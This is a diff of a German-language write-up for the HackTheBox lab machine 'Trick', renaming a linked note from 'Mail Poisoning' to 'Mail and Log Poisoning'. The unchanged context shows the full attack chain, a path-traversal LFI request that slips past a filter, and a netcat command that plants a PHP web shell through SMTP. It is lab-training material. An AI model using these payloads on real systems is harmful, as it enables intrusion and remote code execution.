@@ -13,7 +13,7 @@ techniques: [zone-transfer, sqli, lfi, mail-poisoning, fail2ban, suid]
 | Attacker IP (tun0) | `<attacker-ip>`                             |
 
 > [!info] Kill Chain
-> [[Zone Transfer]] → vHost → [[SQL Injection|SQLi]] (File Read) → nginx-Config → 2. vHost mit [[Local File Inclusion|LFI]] → [[Mail Poisoning]] (RCE) → [[fail2ban Abuse]] → [[SUID Abuse|SUID]] → **root**
+> [[Zone Transfer]] → vHost → [[SQL Injection|SQLi]] (File Read) → nginx-Config → 2. vHost mit [[Local File Inclusion|LFI]] → [[Mail and Log Poisoning]] (RCE) → [[fail2ban Abuse]] → [[SUID Abuse|SUID]] → **root**
 
 ---
 
@@ -82,7 +82,7 @@ curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//
 ```
 => User mit UID 1001 = **`michael`** (`....//` = Nested Traversal gegen den Filter)
 
-## 2.4 LFI → [[Mail Poisoning]] -> RCE
+## 2.4 LFI → [[Mail and Log Poisoning]] -> RCE
 **(1)** PHP-Payload per Mail einschleusen (SMTP 25):
 ```bash
 printf 'HELO trick.htb\nMAIL FROM:<a@trick.htb>\nRCPT TO:<michael@localhost>\nDATA\nSubject: pwn\n\n<?php system($_GET["cmd"]); ?>\n.\nQUIT\n' | nc 10.129.2.82 25
